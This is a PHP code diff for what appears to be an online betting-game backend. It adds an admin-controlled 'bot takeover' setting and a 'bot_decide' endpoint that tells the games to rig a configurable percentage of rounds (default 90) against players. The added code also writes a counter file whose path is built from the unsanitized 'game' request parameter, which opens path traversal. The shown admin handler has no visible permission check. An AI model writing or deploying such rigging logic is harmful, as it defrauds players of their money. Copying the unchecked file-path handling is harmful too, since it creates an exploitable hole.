@@ -993,6 +993,13 @@ switch ($action) {
             }
         }
 
+        $bot_states = [];
+        $bot_game_keys = ['global', 'color_guess', 'aviator', 'teenpatti', 'mines', 'boundary', 'youreleven'];
+        foreach ($bot_game_keys as $bgk) {
+            $db_bot = db_api_request('GET', '/api/db/state/bot_takeover_' . $bgk);
+            $bot_states[$bgk] = is_array($db_bot) ? $db_bot : ['enabled' => false, 'profit_pct' => 90];
+        }
+
         echo json_encode([
             'color_guess' => $colorData,
             'aviator' => [
@@ -1019,7 +1026,8 @@ switch ($action) {
                 })(),
                 'override' => $aviator['admin_override'] ?? ''
             ],
-            'teen_patti' => $tpData
+            'teen_patti' => $tpData,
+            'bot_takeover' => $bot_states
         ]);
         break;
     }
@@ -1152,6 +1160,75 @@ switch ($action) {
         } else {
             echo json_encode(['error' => 'Invalid game type for overrides.']);
         }
+        break;
+    }
+
+    case 'admin_set_bot_takeover': {
+        $game = $_POST['game'] ?? 'global';
+        $enabled = ($_POST['enabled'] ?? 'false') === 'true' || ($_POST['enabled'] ?? false) === true;
+        $profit_pct = intval($_POST['profit_pct'] ?? 90);
+        $profit_pct = max(1, min(100, $profit_pct));
+
+        $state = ['enabled' => $enabled, 'profit_pct' => $profit_pct];
+        db_api_request('POST', '/api/db/state/bot_takeover_' . $game, ['data' => $state]);
+
+        $all_states = [];
+        $bot_game_keys = ['global', 'color_guess', 'aviator', 'teenpatti', 'mines', 'boundary', 'youreleven'];
+        foreach ($bot_game_keys as $bgk) {
+            if ($bgk === $game) {
+                $all_states[$bgk] = $state;
+            } else {
+                $db_bot = db_api_request('GET', '/api/db/state/bot_takeover_' . $bgk);
+                $all_states[$bgk] = is_array($db_bot) ? $db_bot : ['enabled' => false, 'profit_pct' => 90];
+            }
+        }
+
+        echo json_encode([
+            'success' => true,
+            'game' => $game,
+            'config' => $state,
+            'all_states' => $all_states
+        ]);
+        break;
+    }
+
+    case 'bot_decide': {
+        $game = $_GET['game'] ?? $_POST['game'] ?? '';
+        $db_global = db_api_request('GET', '/api/db/state/bot_takeover_global');
+        $db_game = db_api_request('GET', '/api/db/state/bot_takeover_' . $game);
+
+        $enabled = false;
+        $pct = 90;
+        $source = 'none';
+
+        if (is_array($db_global) && !empty($db_global['enabled'])) {
+            $enabled = true;
+            $pct = intval($db_global['profit_pct'] ?? 90);
+            $source = 'global';
+        } elseif (is_array($db_game) && !empty($db_game['enabled'])) {
+            $enabled = true;
+            $pct = intval($db_game['profit_pct'] ?? 90);
+            $source = 'game';
+        }
+
+        if (!$enabled) {
+            echo json_encode(['shouldRig' => false, 'profit_pct' => $pct, 'active' => false, 'source' => 'none']);
+            break;
+        }
+
+        $counter_file = DATA_DIR . '/bot_counter_' . $game . '.txt';
+        $cnt = file_exists($counter_file) ? intval(file_get_contents($counter_file)) : 0;
+        file_put_contents($counter_file, strval(($cnt + 1) % 100));
+
+        $shouldRig = ($cnt % 100) < $pct;
+
+        echo json_encode([
+            'shouldRig' => $shouldRig,
+            'profit_pct' => $pct,
+            'active' => true,
+            'source' => $source,
+            'counter' => $cnt
+        ]);
         break;
     }
 
